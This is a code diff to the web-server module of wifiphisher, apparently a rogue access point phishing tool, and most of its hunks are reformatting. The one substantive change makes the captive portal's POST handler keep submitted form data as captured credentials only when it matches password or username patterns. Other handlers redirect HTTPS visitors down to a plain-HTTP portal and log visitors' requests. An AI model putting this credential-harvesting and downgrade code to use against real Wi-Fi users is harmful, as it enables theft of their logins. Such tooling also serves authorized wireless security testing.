@@ -1,5 +1,6 @@
 import logging
 import json
+import re
 from tornado.escape import json_decode
 import tornado.ioloop
 import tornado.web
@@ -7,7 +8,6 @@ import os.path
 import wifiphisher.common.uimethods as uimethods
 import wifiphisher.common.extensions as extensions
 import wifiphisher.common.constants as constants
-
 
 hn = logging.NullHandler()
 hn.setLevel(logging.DEBUG)
@@ -21,7 +21,6 @@ logger = logging.getLogger(__name__)
 
 
 class DowngradeToHTTP(tornado.web.RequestHandler):
-
     def get(self):
         self.redirect("http://10.0.0.1:8080/")
 
@@ -59,8 +58,7 @@ class BackendHandler(tornado.web.RequestHandler):
         for func_name in list(json_obj.keys()):
             if func_name in backend_methods:
                 # get the corresponding callback
-                callback = getattr(backend_methods[func_name],
-                                   func_name)
+                callback = getattr(backend_methods[func_name], func_name)
                 # fire the corresponding varification method
                 response_to_send[func_name] = callback(json_obj[func_name])
             else:
@@ -70,7 +68,6 @@ class BackendHandler(tornado.web.RequestHandler):
 
 
 class CaptivePortalHandler(tornado.web.RequestHandler):
-
     def get(self):
         """
         Override the get method
@@ -99,8 +96,8 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
             log_file.write("GET request from {0} for {1}\n".format(
                 self.request.remote_ip, self.request.full_url()))
         # record the GET request in the logging file
-        logger.info("GET request from %s for %s",
-                self.request.remote_ip, self.request.full_url())
+        logger.info("GET request from %s for %s", self.request.remote_ip,
+                    self.request.full_url())
 
     def post(self):
         """
@@ -133,9 +130,10 @@ class CaptivePortalHandler(tornado.web.RequestHandler):
                 # record the post requests in the logging file
                 logger.info("POST request from %s with %s",
                             self.request.remote_ip, post_data)
-
-            creds.append(post_data)
-            terminate = True
+            if re.search(constants.REGEX_PWD, post_data, re.IGNORECASE) or \
+            re.search(constants.REGEX_UNAME, post_data, re.IGNORECASE):
+                creds.append(post_data)
+                terminate = True
 
         requested_file = self.request.path[1:]
         template_directory = template.get_path()
@@ -161,25 +159,24 @@ def runHTTPServer(ip, port, ssl_port, t, em):
 
     app = tornado.web.Application(
         [
-            (r"/backend/.*", BackendHandler, {"em": em}),
+            (r"/backend/.*", BackendHandler, {
+                "em": em
+            }),
             (r"/.*", CaptivePortalHandler),
         ],
         template_path=template.get_path(),
         static_path=template.get_path_static(),
         compiled_template_cache=False,
-        ui_methods=uimethods
-    )
+        ui_methods=uimethods)
     app.listen(port, address=ip)
 
-    ssl_app = tornado.web.Application(
-        [
-            (r"/.*", DowngradeToHTTP)
-        ]
-    )
-    https_server = tornado.httpserver.HTTPServer(ssl_app, ssl_options={
-        "certfile": constants.PEM,
-        "keyfile": constants.PEM,
-    })
+    ssl_app = tornado.web.Application([(r"/.*", DowngradeToHTTP)])
+    https_server = tornado.httpserver.HTTPServer(
+        ssl_app,
+        ssl_options={
+            "certfile": constants.PEM,
+            "keyfile": constants.PEM,
+        })
     https_server.listen(ssl_port, address=ip)
 
     tornado.ioloop.IOLoop.instance().start()
